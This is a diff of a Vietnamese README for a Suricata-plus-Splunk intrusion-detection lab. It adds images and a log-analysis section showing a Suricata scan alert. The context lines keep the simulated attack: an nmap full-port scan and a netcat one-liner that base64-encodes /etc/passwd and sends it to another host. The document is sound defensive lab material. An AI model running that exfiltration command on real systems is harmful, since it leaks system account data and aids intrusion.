@@ -14,7 +14,7 @@
 
 ## 3. Sơ đồ mạng
 
-<img width="750" height="392" alt="Suricata+splunk" src="https://github.com/user-attachments/assets/93aff2d7-7bc9-4e42-bc34-aa9933492374" />
+<img width="750" height="392" alt="Suricata+splunk" src="https://github.com/user-attachments/assets/ae4f6a81-9529-4710-b9c4-0a1d1fb5547f" />
 
 ## 4. Các bước tiến hành
 
@@ -119,6 +119,7 @@ sudo /opt/splunkforwarder/bin/splunk restart
 nmap -sS -T4 -p- 192.168.100.20
 ```
 
+<img width="676" height="417" alt="image" src="https://github.com/user-attachments/assets/056e6094-62be-4ca2-afac-0b0c72fdea7a" />
 
 2. **Mô phỏng trích xuất thông tin từ máy nạn nhân**
 
@@ -130,4 +131,34 @@ nc -lvnp 5555
 
 # Victim
 cat /etc/passwd | base64 | nc 192.168.0.30 5555
+```
+
+### Bước 5: Phân tích log
+
+1. Log của Nmap
+
+```
+{ [-]
+   alert: { [+]
+   }
+   dest_ip: 192.168.0.20
+   dest_port: 1521
+   direction: to_server
+   event_type: alert
+   flow: { [+]
+   }
+   flow_id: 2074347087003202
+   in_iface: ens33
+   ip_v: 4
+   pkt_src: wire/pcap
+   proto: TCP
+   src_ip: 192.168.0.30
+   src_port: 47182
+   timestamp: 2026-03-02T23:28:23.155291+0700
+}
+
+    alert.signature = ET SCAN Suspicious inbound to Oracle SQL port 1521
+    host = hoang
+    source = /var/log/suricata/eve.json
+    sourcetype = suricata
 ```
